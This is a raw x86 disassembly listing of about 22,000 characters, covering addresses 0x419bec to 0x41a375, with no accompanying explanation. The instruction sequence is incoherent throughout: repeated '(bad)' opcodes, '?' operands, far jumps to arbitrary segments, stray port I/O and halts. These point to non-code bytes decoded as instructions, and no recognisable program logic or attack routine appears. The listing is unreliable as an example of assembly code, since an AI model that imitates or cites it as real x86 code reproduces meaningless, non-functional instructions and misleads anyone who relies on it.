  419bec:	jae    0x419c42
  419bee:	jmp    0xc70a:0x3d8de798
  419bf5:	sub    al,0x13
  419bf7:	daa    
  419bf8:	into   
  419bf9:	(bad)  
  419bfa:	out    0x2e,al
  419bfc:	call   0x52cf:0xf8d8f2a6
  419c03:	repnz jmp 0x5764:0x49b5f61e
  419c0b:	pop    esp
  419c0c:	clc    
  419c0d:	xchg   ebx,eax
  419c0e:	xchg   edx,eax
  419c0f:	xchg   dl,bh
  419c11:	retf   0x4100
  419c14:	rol    DWORD PTR [edx+ebx*8],1
  419c17:	fincstp 
  419c19:	leave  
  419c1a:	fld    QWORD PTR [esi+0x46eaf9ac]
  419c20:	xchg   BYTE PTR [eax-0xd],dl
  419c23:	aad    0x67
  419c25:	scas   eax,DWORD PTR es:[edi]
  419c26:	dec    esp
  419c27:	mov    al,0x7
  419c29:	jge    0x419bfc
  419c2b:	dec    ecx
  419c2c:	cld    
  419c2d:	fmul   QWORD PTR [edx]
  419c2f:	push   ss
  419c30:	inc    ebx
  419c31:	lods   eax,DWORD PTR ds:[esi]
  419c32:	pushf  
  419c33:	ret    0xe781
  419c36:	shr    DWORD PTR [eax],cl
  419c38:	xchg   edi,edi
  419c3a:	leave  
  419c3b:	clc    
  419c3c:	pushw  cs
  419c3e:	push   ebp
  419c3f:	mov    WORD PTR es:[ebp-0x4cb0ed7f],cs
  419c46:	lahf   
  419c47:	pop    edi
  419c48:	mov    ebx,0x52f443b4
  419c4d:	daa    
  419c4e:	shl    BYTE PTR [edx-0x31314dbe],1
  419c54:	push   ss
  419c55:	fs sub eax,0x665fe619
  419c5b:	push   0x87ec7988
  419c60:	outs   dx,DWORD PTR ds:[esi]
  419c61:	bound  esi,QWORD PTR [ebx]
  419c63:	sub    dh,BYTE PTR [edx-0x49]
  419c66:	push   edx
  419c67:	fstp   QWORD PTR [ecx]
  419c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c6a:	sub    BYTE PTR [ebx+edi*2],cl
  419c6d:	retf   
  419c6e:	xchg   edi,eax
  419c6f:	jmp    0xce23693d
  419c74:	pop    edi
  419c75:	test   BYTE PTR [ebx],bh
  419c77:	jl     0x419ce7
  419c79:	sbb    edi,DWORD PTR [ebx+0x3c]
  419c7c:	push   eax
  419c7d:	pop    ecx
  419c7e:	mov    bl,0xb2
  419c80:	hlt    
  419c81:	clc    
  419c82:	mov    eax,0x9d322a30
  419c87:	and    ch,BYTE PTR [esi-0x53]
  419c8a:	imul   esp,DWORD PTR [ebx-0x10],0x7f8864c6
  419c91:	cld    
  419c92:	dec    ebp
  419c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c94:	out    0x1e,eax
  419c96:	scas   al,BYTE PTR es:[edi]
  419c97:	(bad)  [eax-0x1313a643]
  419c9d:	xor    al,0xe3
  419c9f:	ficomp WORD PTR [edx-0x6f]
  419ca2:	fistp  WORD PTR [esi-0x714c276d]
  419ca8:	stos   DWORD PTR es:[edi],eax
  419ca9:	sti    
  419caa:	(bad)  
  419cab:	mov    edx,esi
  419cad:	mov    dl,0x62
  419caf:	imul   edi,DWORD PTR [ecx+esi*8+0x4f],0xd68616ce
  419cb7:	xor    dh,bh
  419cb9:	push   eax
  419cba:	mov    eax,0xc753ae54
  419cbf:	test   DWORD PTR cs:[edi],0xce4fce08
  419cc6:	add    ah,ah
  419cc8:	xor    eax,0x3e4ff9e
  419ccd:	dec    eax
  419cce:	ins    DWORD PTR es:[edi],dx
  419ccf:	retf   
  419cd0:	dec    esp
  419cd1:	sahf   
  419cd2:	sub    eax,0x14dab43f
  419cd7:	mov    DWORD PTR [ecx],esi
  419cd9:	and    al,0xf2
  419cdb:	pop    esp
  419cdc:	xor    esp,edx
  419cde:	xor    eax,0x3bc64880
  419ce3:	fistp  QWORD PTR [ebx-0x60]
  419ce6:	cli    
  419ce7:	dec    ebx
  419ce8:	jbe    0x419d30
  419cea:	ja     0x419ca1
  419cec:	aaa    
  419ced:	gs scas eax,DWORD PTR es:[edi]
  419cef:	call   0x59c0e8a7
  419cf4:	xchg   ebx,eax
  419cf5:	in     eax,dx
  419cf6:	add    eax,0x2b0bf986
  419cfb:	xor    ebx,DWORD PTR fs:[eax+eiz*1+0x19]
  419d00:	and    al,0x4
  419d02:	pushfw 
  419d04:	push   ss
  419d05:	mov    DWORD PTR [ebx+0x6137cc37],ecx
  419d0b:	repz mov esi,0x1442a615
  419d11:	int    0xfd
  419d13:	push   esp
  419d14:	sahf   
  419d15:	pop    esi
  419d16:	cmp    DWORD PTR [esi+0x3e],esi
  419d19:	xor    BYTE PTR ds:0xb534f083,ch
  419d1f:	xor    al,0x22
  419d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d22:	jno    0x419d28
  419d24:	mov    ah,0x52
  419d26:	xor    DWORD PTR [edx+edx*8+0x3d675f8d],edi
  419d2d:	or     al,0x1b
  419d2f:	retf   0xb176
  419d32:	add    bh,ah
  419d34:	mov    ebp,0x43d0ebb9
  419d39:	jae    0x419cd4
  419d3b:	mov    eax,ds:0x222e221c
  419d40:	dec    eax
  419d41:	loop   0x419d53
  419d43:	in     al,dx
  419d44:	cmp    eax,0x52702855
  419d49:	add    eax,esi
  419d4b:	jmp    0x4a25:0x9ab5a228
  419d52:	fbld   TBYTE PTR [edx]
  419d54:	in     al,0xe2
  419d56:	mov    cl,0xe1
  419d58:	cmp    DWORD PTR [edi+eiz*8-0x7f65782b],ebp
  419d5f:	xor    dl,al
  419d61:	pop    edi
  419d62:	fisub  DWORD PTR [edx-0x79033748]
  419d68:	retf   
  419d69:	or     eax,0xd36d1061
  419d6e:	pop    ds
  419d6f:	fcompp 
  419d71:	jle    0x419cff
  419d73:	sbb    DWORD PTR [edx],ebp
  419d75:	and    ah,BYTE PTR [edx+0x2242dc4b]
  419d7b:	adc    dl,bh
  419d7d:	or     eax,ebx
  419d7f:	call   0xc28a87f3
  419d84:	bound  esp,QWORD PTR [eax*1-0x27385172]
  419d8b:	in     al,0xcc
  419d8d:	pop    ds
  419d8e:	shr    BYTE PTR [esi],0xe2
  419d91:	ss mov cl,0x24
  419d94:	into   
  419d95:	je     0x419dab
  419d97:	into   
  419d98:	inc    edx
  419d99:	dec    esi
  419d9a:	sub    eax,0xa79fec7e
  419d9f:	adc    DWORD PTR [edx+0x7e96fb51],ebx
  419da5:	imul   eax,DWORD PTR [ecx-0x5d],0xffffff97
  419da9:	lods   eax,DWORD PTR ds:[esi]
  419daa:	retf   0x3562
  419dad:	mov    cl,al
  419daf:	sbb    ecx,DWORD PTR [ebp-0x4036e3e7]
  419db5:	mov    ds,WORD PTR [ebx+0x12]
  419db8:	scas   al,BYTE PTR es:[edi]
  419db9:	ret    0x6ffd
  419dbc:	in     eax,dx
  419dbd:	(bad)  
  419dbe:	adc    dl,BYTE PTR [ebp+ebx*1-0xc7e44b]
  419dc5:	mov    ebp,0xa42766be
  419dca:	sar    DWORD PTR [esi-0x2e0f75d1],cl
  419dd0:	xor    eax,0xb225c3ab
  419dd5:	inc    edi
  419dd6:	jmp    0x419daa
  419dd8:	repnz out 0x7,al
  419ddb:	jle    0x419dfe
  419ddd:	jmp    0xfb594954
  419de2:	or     DWORD PTR [esi+0x19],edx
  419de5:	fistp  DWORD PTR [esp+edi*1-0x2987aa5d]
  419dec:	daa    
  419ded:	jns    0x419d91
  419def:	imul   edi,ebp,0x938402cd
  419df5:	out    0xe4,eax
  419df7:	sbb    BYTE PTR [ebx],bh
  419df9:	inc    ecx
  419dfa:	test   al,0xa3
  419dfc:	sub    esi,0xe91986e4
  419e02:	pop    es
  419e03:	ds (bad) 
  419e05:	sub    eax,0xfbe9c104
  419e0a:	loopne 0x419e66
  419e0c:	cmp    DWORD PTR [eax],0x1e
  419e0f:	(bad)
  419e13:	push   ds
  419e14:	inc    dh
  419e16:	repnz add bl,cl
  419e19:	sbb    eax,0xb992c82b
  419e1e:	xor    bl,cl
  419e20:	popf   
  419e21:	adc    BYTE PTR [eax-0x9],dh
  419e24:	fwait
  419e25:	das    
  419e26:	mov    cl,0xbd
  419e28:	cmp    BYTE PTR [edi+0x2af2b169],0xd7
  419e2f:	lods   al,BYTE PTR ds:[esi]
  419e30:	mov    ds:0xfcb074d6,eax
  419e35:	rol    BYTE PTR [eax+0x50],0x67
  419e39:	popa   
  419e3a:	outs   dx,DWORD PTR ds:[esi]
  419e3b:	inc    ebx
  419e3c:	xchg   edx,eax
  419e3d:	rcr    BYTE PTR [bp+0xbda],0x87
  419e43:	rcr    DWORD PTR [ebp-0x52b8373],0xc8
  419e4a:	outs   dx,BYTE PTR ds:[esi]
  419e4b:	sub    DWORD PTR [edi+0x62aced4a],esi
  419e51:	xchg   ebp,eax
  419e52:	push   ebp
  419e53:	xchg   esi,eax
  419e54:	and    BYTE PTR [ecx+0x21ca2237],cl
  419e5a:	mov    ds:0xbe25213,eax
  419e5f:	push   cs
  419e60:	daa    
  419e61:	pop    esp
  419e62:	mov    cl,ah
  419e64:	mov    dh,0x7
  419e66:	retf   
  419e67:	mov    al,ds:0x98f8b06c
  419e6c:	retf   0xe411
  419e6f:	hlt    
  419e70:	in     al,dx
  419e71:	adc    esp,DWORD PTR [edi]
  419e73:	xchg   edx,eax
  419e74:	xlat   BYTE PTR ds:[ebx]
  419e75:	or     BYTE PTR gs:[edx],bl
  419e78:	add    BYTE PTR [ecx+esi*2+0x43366f66],bh
  419e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e80:	jnp    0x419ee4
  419e82:	cmp    bl,ah
  419e84:	mov    bh,0xbf
  419e86:	cmp    dh,BYTE PTR [esi-0xe]
  419e89:	add    BYTE PTR [ecx+0x3d],ch
  419e8c:	cvtdq2ps xmm3,XMMWORD PTR [ecx+0x37]
  419e90:	xchg   edx,eax
  419e91:	mov    WORD PTR [esi+0x4d],?
  419e94:	and    al,0x11
  419e96:	ret    0x4bdd
  419e99:	pop    edx
  419e9a:	adc    BYTE PTR [esi-0x15],0xab
  419e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e9f:	pop    eax
  419ea0:	(bad)  
  419ea2:	(bad)  
  419ea3:	adc    dh,BYTE PTR [edi]
  419ea5:	mov    eax,esi
  419ea7:	hlt    
  419ea8:	pop    eax
  419ea9:	stos   BYTE PTR es:[edi],al
  419eaa:	jl     0x419ea4
  419eac:	mov    ch,0xc4
  419eae:	or     al,0x7b
  419eb0:	pop    ds
  419eb1:	data16 sub al,0xbe
  419eb4:	cmp    bh,dl
  419eb6:	push   es
  419eb7:	test   DWORD PTR [edx-0x5969895c],esi
  419ebd:	outs   dx,DWORD PTR ds:[esi]
  419ebe:	xor    ah,cl
  419ec0:	les    ecx,FWORD PTR [eax+0x5d3935e8]
  419ec6:	lods   al,BYTE PTR ds:[esi]
  419ec7:	sbb    BYTE PTR [ebx],0x18
  419eca:	inc    ebx
  419ecb:	pusha  
  419ecc:	pop    esi
  419ecd:	mov    edi,0x9ed654ea
  419ed2:	cli    
  419ed3:	cdq    
  419ed4:	ret    
  419ed5:	xor    BYTE PTR [edi],bh
  419ed7:	and    DWORD PTR [eax-0x47],edi
  419eda:	ds mov bh,0x65
  419edd:	pop    esp
  419ede:	popf   
  419edf:	sub    eax,DWORD PTR [ecx]
  419ee1:	les    edx,FWORD PTR [ebp+edi*8+0x61b8bc0]
  419ee8:	mov    ecx,0x9d14d82f
  419eed:	sbb    BYTE PTR [eax-0x6f3ecc4c],bh
  419ef3:	hlt    
  419ef4:	adc    BYTE PTR [ebx-0x36],bh
  419ef7:	in     eax,0x53
  419ef9:	neg    DWORD PTR [esi+0x5e02b623]
  419eff:	arpl   si,dx
  419f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f02:	xchg   ebp,eax
  419f03:	fidiv  WORD PTR [edi-0x6a]
  419f06:	ja     0x419ea8
  419f08:	out    dx,al
  419f09:	sbb    bl,BYTE PTR [edi]
  419f0b:	and    BYTE PTR [ebx-0x673a2601],cl
  419f11:	fst    st(4)
  419f13:	mov    esp,0x779e5ac5
  419f18:	or     ch,BYTE PTR [esi]
  419f1a:	fs clc 
  419f1c:	aad    0x91
  419f1e:	outs   dx,DWORD PTR ds:[esi]
  419f1f:	fisttp QWORD PTR [eax-0x362732d8]
  419f25:	cmp    eax,0xce790305
  419f2a:	xor    edi,ebx
  419f2c:	shl    DWORD PTR [edi+0x203434a],0x4b
  419f33:	and    ebp,0xe7656a9e
  419f39:	out    dx,eax
  419f3a:	push   esi
  419f3b:	enter  0xe5ba,0x9e
  419f3f:	imul   ecx,DWORD PTR [eax],0xffffff98
  419f42:	push   es
  419f43:	sub    eax,0x513a5c80
  419f48:	sub    BYTE PTR [eax-0x2d],0xd4
  419f4c:	sbb    bh,BYTE PTR [ebp-0x57]
  419f4f:	push   ds
  419f50:	sbb    ch,dh
  419f52:	rcr    BYTE PTR [edi-0xf],1
  419f55:	(bad)  
  419f56:	call   0x290bb0a1
  419f5b:	test   DWORD PTR [ebx],edx
  419f5d:	in     eax,0x20
  419f5f:	or     DWORD PTR [ecx+edi*8+0x630fb405],edi
  419f66:	mov    al,0x35
  419f68:	test   al,0xcb
  419f6a:	mov    DWORD PTR ds:0xa671b44,edi
  419f70:	mov    BYTE PTR [ebx-0x7d],ch
  419f73:	pop    ss
  419f74:	js     0x419fac
  419f76:	int    0x5f
  419f78:	and    BYTE PTR [eax-0x38],0x7
  419f7c:	fcmovnu st,st(3)
  419f7e:	and    bl,bh
  419f80:	xchg   BYTE PTR [ebx+0x66],cl
  419f83:	(bad)  
  419f85:	jo     0x419f48
  419f87:	jmp    0xad4210ef
  419f8c:	xor    eax,0x87656d64
  419f91:	fs jns 0x419f39
  419f94:	pop    ecx
  419f95:	ret    0xf839
  419f98:	out    0x69,al
  419f9a:	cmp    DWORD PTR [esp+edx*1+0x43],ecx
  419f9e:	test   BYTE PTR [esi],bh
  419fa0:	in     eax,0xc
  419fa2:	mov    WORD PTR [esi+edi*4+0x2d],ds
  419fa6:	xchg   esp,eax
  419fa7:	ror    DWORD PTR [eax],0xa8
  419faa:	inc    DWORD PTR [edx-0x29]
  419fad:	mov    WORD PTR [eax-0x54d08eb2],?
  419fb3:	xchg   esi,eax
  419fb4:	xchg   ebx,eax
  419fb5:	fcomi  st,st(5)
  419fb7:	dec    edi
  419fb8:	xchg   DWORD PTR [ecx+0x28],edi
  419fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fbc:	fstp   QWORD PTR [eax+0x7]
  419fbf:	pop    edx
  419fc0:	loope  0x419f4d
  419fc2:	rol    edx,0x85
  419fc5:	mov    ds:0xd03d553f,al
  419fca:	and    DWORD PTR [edx+0x16],ecx
  419fcd:	mov    esp,0x86bebd17
  419fd2:	and    DWORD PTR ds:0x79eed96e,ebx
  419fd8:	push   ebx
  419fd9:	sub    dh,bl
  419fdb:	lods   eax,DWORD PTR ds:[esi]
  419fdc:	out    0x45,eax
  419fde:	outs   dx,BYTE PTR ds:[esi]
  419fdf:	out    0x26,al
  419fe1:	push   ecx
  419fe2:	pop    esp
  419fe3:	pushf  
  419fe4:	sahf   
  419fe5:	jae    0x419fdb
  419fe7:	cmp    bl,cl
  419fe9:	inc    esp
  419fea:	sub    DWORD PTR [esi-0x31],edx
  419fed:	adc    BYTE PTR [edx],ah
  419fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ff0:	adc    ebx,DWORD PTR [esi+0x66]
  419ff3:	mov    ebp,0xc57de3c5
  419ff8:	inc    esp
  419ff9:	pusha  
  419ffa:	fnstcw WORD PTR [ebx-0x3ae814a4]
  41a000:	daa    
  41a001:	mov    esi,0x62c3de12
  41a006:	and    esi,DWORD PTR [ebp+0x7b]
  41a009:	add    eax,0x88954448
  41a00e:	inc    esi
  41a00f:	mov    ecx,0xcda7ea21
  41a014:	jbe    0x419f99
  41a016:	mov    ds:0x40c75196,al
  41a01b:	mov    ch,bl
  41a01d:	popa   
  41a01e:	out    dx,al
  41a01f:	into   
  41a020:	jl     0x419fbf
  41a022:	pop    edx
  41a024:	jge    0x419fde
  41a026:	enter  0xe5b4,0x55
  41a02a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a02b:	add    ecx,DWORD PTR [ebp-0x44]
  41a02e:	or     al,BYTE PTR [eax]
  41a030:	adc    edx,ecx
  41a032:	fild   QWORD PTR [eax]
  41a034:	pop    ds
  41a035:	cmp    eax,0x5110683
  41a03a:	ret    0x2582
  41a03d:	cld    
  41a03e:	jmp    0xb77e:0xaeb8f5e3
  41a045:	jg     0x41a0b1
  41a047:	xchg   ebx,eax
  41a048:	adc    DWORD PTR [ebx-0xc],edi
  41a04b:	jbe    0x41a0a4
  41a04d:	push   0xffffffb0
  41a04f:	test   eax,0x127770bb
  41a054:	dec    ebx
  41a055:	loop   0x41a050
  41a057:	push   ebp
  41a058:	or     edi,DWORD PTR [edx-0x62e9b53]
  41a05e:	stc    
  41a05f:	push   ecx
  41a060:	adc    eax,0x1f84749d
  41a065:	call   0xb5d6:0x836b0f86
  41a06c:	int3   
  41a06d:	mov    edi,0x68727fa9
  41a072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a073:	popa   
  41a074:	sub    BYTE PTR [esp+eax*1+0x1dc430eb],0xa0
  41a07c:	push   ss
  41a07d:	adc    al,0x6e
  41a07f:	pop    ebp
  41a080:	dec    edx
  41a081:	xlat   BYTE PTR ds:[ebx]
  41a082:	mov    ebx,ebp
  41a084:	sbb    esp,DWORD PTR [esi+0x27fbf2d0]
  41a08a:	mov    ebx,0x5f3dcbff
  41a08f:	in     eax,dx
  41a090:	xchg   edi,eax
  41a091:	adc    ebx,eax
  41a093:	das    
  41a094:	sub    al,0xcb
  41a097:	sbb    al,0x67
  41a099:	xor    bh,cl
  41a09b:	popf   
  41a09c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a09d:	pop    edx
  41a09e:	jge    0x41a0fa
  41a0a0:	test   al,0x14
  41a0a2:	inc    esp
  41a0a3:	push   0x9
  41a0a5:	iret   
  41a0a6:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41a0a8:	jp     0x41a0cf
  41a0aa:	pushf  
  41a0ab:	hlt    
  41a0ac:	xchg   edi,eax
  41a0ad:	pop    eax
  41a0ae:	mov    ebp,0x437dcb63
  41a0b3:	stos   BYTE PTR es:[edi],al
  41a0b4:	shl    DWORD PTR [esi+0x3e],1
  41a0b7:	sti    
  41a0b8:	jns    0x41a0b3
  41a0ba:	pop    ebp
  41a0bb:	in     al,0xdc
  41a0bd:	push   ebx
  41a0be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0bf:	ss int3 
  41a0c1:	test   BYTE PTR ds:0x903353f6,ch
  41a0c7:	xor    DWORD PTR [edx-0x2b],eax
  41a0ca:	int    0xa1
  41a0cc:	into   
  41a0cd:	into   
  41a0ce:	mov    WORD PTR [ecx+0x35],?
  41a0d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0d2:	mov    ecx,0xa92799a1
  41a0d7:	es pop ebx
  41a0d9:	aad    0x37
  41a0db:	enter  0x509e,0x55
  41a0df:	push   es
  41a0e0:	cmp    eax,0x43bed2b1
  41a0e5:	test   DWORD PTR [ecx-0x2bfb23ee],ebx
  41a0eb:	cld    
  41a0ec:	mov    edx,0x340b1a7a
  41a0f1:	sub    ebp,DWORD PTR [esi-0x3e47247a]
  41a0f7:	add    al,BYTE PTR [ecx+edi*4]
  41a0fa:	and    al,0x9
  41a0fc:	pop    ds
  41a0fd:	push   esi
  41a0fe:	mov    edx,0x378e68d9
  41a103:	repnz mov BYTE PTR [ebx+edi*8+0x37],bh
  41a108:	mov    ch,0x33
  41a10a:	mov    ecx,esp
  41a10c:	add    al,0x46
  41a10e:	push   ss
  41a10f:	xor    DWORD PTR [edx],esp
  41a111:	cmpxchg DWORD PTR [ecx],ecx
  41a114:	loop   0x41a0b7
  41a116:	pop    es
  41a117:	mov    ch,0xa0
  41a119:	ret    
  41a11a:	dec    eax
  41a11b:	sar    dh,cl
  41a11d:	fadd   st,st(7)
  41a11f:	xchg   ebx,eax
  41a120:	mov    cl,0x83
  41a122:	push   ss
  41a123:	iret   
  41a124:	xor    dl,BYTE PTR [edx]
  41a126:	inc    esi
  41a127:	arpl   WORD PTR [ebx+0x71],cx
  41a12a:	fsub   QWORD PTR [eax]
  41a12c:	scas   eax,DWORD PTR es:[edi]
  41a12d:	jae    0x41a12f
  41a12f:	push   edx
  41a130:	outs   dx,DWORD PTR ds:[esi]
  41a131:	mov    esp,0x2db58613
  41a136:	or     ecx,DWORD PTR [ebx+0x42]
  41a139:	sub    edx,DWORD PTR ds:0xe0434b3d
  41a13f:	add    esp,0x5f
  41a142:	mov    cl,0x3e
  41a144:	stos   DWORD PTR es:[edi],eax
  41a145:	mov    ebx,0x4d732d9c
  41a14a:	loopne 0x41a1a9
  41a14c:	xchg   esi,eax
  41a14d:	xchg   esp,eax
  41a14e:	mov    eax,0xf5a6cc15
  41a153:	jno    0x41a1c3
  41a155:	aas    
  41a156:	dec    eax
  41a157:	sahf   
  41a158:	test   DWORD PTR [edx-0x6e],ebx
  41a15b:	pop    ebx
  41a15c:	and    al,0xe0
  41a15e:	mov    al,0x55
  41a160:	pop    edx
  41a161:	jae    0x41a154
  41a163:	fbld   TBYTE PTR [eax+0x45]
  41a166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a167:	mov    esp,0x8cf6f7d0
  41a16c:	fwait
  41a16d:	addr16 test eax,edx
  41a170:	in     al,dx
  41a171:	mov    al,0x24
  41a173:	xor    eax,0x695dfa4e
  41a178:	mov    DWORD PTR [edx],esi
  41a17a:	or     ebx,ecx
  41a17c:	loop   0x41a12f
  41a17e:	xor    al,0x54
  41a180:	xor    BYTE PTR [ecx+0x1896976d],dh
  41a186:	mov    dh,0x52
  41a188:	repnz mov cl,0xc0
  41a18b:	jnp    0x41a116
  41a18d:	xchg   ebx,eax
  41a18e:	jle    0x41a14d
  41a190:	sar    cl,cl
  41a192:	ret    
  41a193:	mov    al,ds:0x2c123f02
  41a198:	leave  
  41a199:	mov    bl,0x7
  41a19b:	sub    eax,0xd139b192
  41a1a0:	add    eax,0x872f17f7
  41a1a5:	jb     0x41a14f
  41a1a7:	aad    0x4e
  41a1a9:	adc    ebp,DWORD PTR [ebp-0x65]
  41a1ac:	jl     0x41a193
  41a1ae:	lahf   
  41a1af:	push   ss
  41a1b0:	push   edx
  41a1b1:	mov    ds:0x1bfbde88,al
  41a1b6:	in     al,0x7f
  41a1b8:	rcl    edi,0xd4
  41a1bb:	pop    edx
  41a1bc:	inc    esp
  41a1bd:	shl    DWORD PTR [ebx],1
  41a1bf:	dec    ebp
  41a1c0:	(bad)  
  41a1c1:	mov    ebp,0xab288b96
  41a1c6:	xor    esp,DWORD PTR [edx-0x525ddee2]
  41a1cc:	lds    ebx,FWORD PTR [edi+0x7d]
  41a1cf:	inc    ebp
  41a1d0:	mov    BYTE PTR [eax-0x80],cl
  41a1d3:	lock setb BYTE PTR [ecx]
  41a1d7:	push   esp
  41a1d8:	(bad)  
  41a1d9:	push   cs
  41a1da:	ret    0x1d90
  41a1dd:	ret    
  41a1de:	xor    bl,cl
  41a1e0:	data16 xchg BYTE PTR [edi],ah
  41a1e3:	pusha  
  41a1e4:	mov    ch,0x9d
  41a1e6:	je     0x41a1fe
  41a1e8:	push   ebp
  41a1e9:	mov    WORD PTR [esp+edi*2],ax
  41a1ed:	dec    ecx
  41a1ee:	xchg   esi,eax
  41a1ef:	pop    ds
  41a1f0:	jno    0x41a241
  41a1f2:	mov    ds:0xb9f6eab8,eax
  41a1f7:	add    al,0x17
  41a1f9:	rcl    BYTE PTR [ecx+0x6f16bda4],cl
  41a1ff:	jns    0x41a1ff
  41a201:	cld    
  41a202:	jae    0x41a249
  41a204:	cmp    BYTE PTR [esi+0x6aa491bd],cl
  41a20a:	pop    ebp
  41a20b:	cmp    dl,BYTE PTR [eax+0x3b]
  41a20e:	nop
  41a20f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a210:	sbb    ebx,DWORD PTR [ebx]
  41a212:	in     al,0xcb
  41a214:	mov    dh,BYTE PTR [ebx+0x75]
  41a217:	dec    ebp
  41a218:	ror    DWORD PTR [edx-0x61],0x74
  41a21c:	xchg   BYTE PTR [esp+edx*4-0x2ae583ec],cl
  41a223:	and    DWORD PTR [eax-0x32],ebp
  41a226:	imul   edx,DWORD PTR [esi],0x7
  41a229:	xchg   esi,eax
  41a22a:	dec    ebp
  41a22b:	jmp    0xe3b1:0xe99f9c2e
  41a232:	lea    edi,[edx+0x53]
  41a235:	mov    esi,0xd9618b0f
  41a23a:	push   ds
  41a23b:	clc    
  41a23c:	cmp    BYTE PTR [edi+0x40],cl
  41a23f:	dec    ecx
  41a240:	and    DWORD PTR [ecx-0x7a],esp
  41a243:	and    edx,DWORD PTR [ebx+ebx*8+0x27cb306f]
  41a24a:	(bad)  
  41a24c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a24d:	popa   
  41a24e:	enter  0x35b,0xc9
  41a252:	push   edi
  41a253:	(bad)  [ecx+eiz*2+0x33]
  41a257:	stc    
  41a258:	mov    bh,0x90
  41a25a:	mov    bh,BYTE PTR [ebp+0xa]
  41a25d:	fsub   st(6),st
  41a25f:	fist   WORD PTR [edx-0x5a70e4d1]
  41a265:	ins    BYTE PTR es:[edi],dx
  41a266:	mov    dh,0x17
  41a268:	mov    ecx,0x95b79590
  41a26d:	and    eax,0x73780570
  41a272:	and    al,0x57
  41a274:	out    0xef,al
  41a276:	pop    ecx
  41a277:	mov    al,0xd3
  41a279:	into   
  41a27a:	ins    BYTE PTR es:[edi],dx
  41a27b:	push   eax
  41a27c:	leave  
  41a27d:	(bad)  
  41a27e:	mov    ch,0xbf
  41a280:	lds    ebx,FWORD PTR [edi-0x4b79d032]
  41a286:	imul   ecx
  41a288:	idiv   cl
  41a28a:	mov    al,ds:0x3b175372
  41a28f:	and    DWORD PTR [ecx-0x3c],edi
  41a292:	scas   eax,DWORD PTR es:[edi]
  41a293:	pop    ds
  41a294:	out    dx,al
  41a295:	mov    ah,0xc
  41a297:	and    BYTE PTR [esi-0x5],bh
  41a29a:	cmp    al,0xa
  41a29c:	in     al,dx
  41a29d:	push   ecx
  41a29e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a29f:	cmp    BYTE PTR [ebx-0x42aa8231],ah
  41a2a5:	xchg   edi,eax
  41a2a6:	push   ebx
  41a2a7:	mov    ebp,0xea92b25f
  41a2ac:	xor    al,0x42
  41a2ae:	lahf   
  41a2af:	les    eax,FWORD PTR [eax+edi*2]
  41a2b2:	add    esp,ebx
  41a2b4:	adc    edi,DWORD PTR [edi+0x7a]
  41a2b7:	cmp    al,0xd
  41a2b9:	cmp    BYTE PTR [ebp+edx*8+0x2f],bh
  41a2bd:	cld    
  41a2be:	leave  
  41a2bf:	and    DWORD PTR [edx-0x50a9966c],0x421f4e73
  41a2c9:	mov    eax,ss:0xc24287cd
  41a2cf:	rol    DWORD PTR [ebx-0x5c],1
  41a2d2:	dec    eax
  41a2d3:	add    eax,DWORD PTR [ebp+0x5c12f796]
  41a2d9:	pop    ss
  41a2da:	jmp    0x41a291
  41a2dc:	aad    0xdf
  41a2de:	or     eax,0x39b3a2d4
  41a2e3:	lock std 
  41a2e5:	jb     0x41a296
  41a2e7:	mov    ds,WORD PTR [edx+0x5c]
  41a2ea:	or     dh,dh
  41a2ec:	pop    ebp
  41a2ed:	out    dx,eax
  41a2ee:	fstp   TBYTE PTR [ebx+0x3b]
  41a2f1:	aas    
  41a2f2:	mov    BYTE PTR [edi+0x7c615ea4],0x32
  41a2f9:	xor    al,0x8
  41a2fb:	mov    ch,0xe
  41a2fd:	pusha  
  41a2fe:	jns    0x41a2ee
  41a300:	test   BYTE PTR [edi+0x3c],0xe4
  41a304:	sbb    ch,BYTE PTR [edx]
  41a306:	add    eax,0xd1c936a
  41a30b:	inc    ecx
  41a30c:	lds    esi,FWORD PTR [eax-0xb767e62]
  41a312:	inc    edx
  41a313:	test   DWORD PTR [ebp+0x1c],esp
  41a316:	int3   
  41a317:	inc    edi
  41a318:	or     DWORD PTR [edi],edi
  41a31a:	cdq    
  41a31b:	rol    BYTE PTR [eax+0x6f],1
  41a31e:	iret   
  41a31f:	sub    al,0x4b
  41a321:	int3   
  41a322:	xchg   ecx,eax
  41a323:	iret   
  41a324:	and    al,0x64
  41a326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a327:	or     esp,DWORD PTR [bx+di+0x6216]
  41a32c:	mov    dh,0x9d
  41a32e:	sbb    bl,BYTE PTR [esi]
  41a330:	rcl    ecx,0x9f
  41a333:	dec    ecx
  41a334:	fcomp  QWORD PTR [edx-0x75]
  41a337:	add    DWORD PTR ds:[esi+0x8513ae9],ebx
  41a33e:	sbb    ch,BYTE PTR [edi+eax*8]
  41a341:	cmp    eax,0xc3e8922a
  41a346:	and    DWORD PTR [eax-0x3e3dd0a2],edx
  41a34c:	sbb    DWORD PTR [eax+0x229d5fd7],ebp
  41a352:	(bad)  
  41a353:	loop   0x41a321
  41a355:	popf   
  41a356:	adc    bl,BYTE PTR [ecx+0x19b36939]
  41a35c:	bound  ebp,QWORD PTR [edi+ebx*8-0x2d]
  41a360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a361:	mov    BYTE PTR [edx+0x5657068d],dh
  41a367:	push   0x8089275
  41a36c:	adc    eax,0xeca17419
  41a371:	retw   0xbcae
  41a375:	mov    bl,0x45
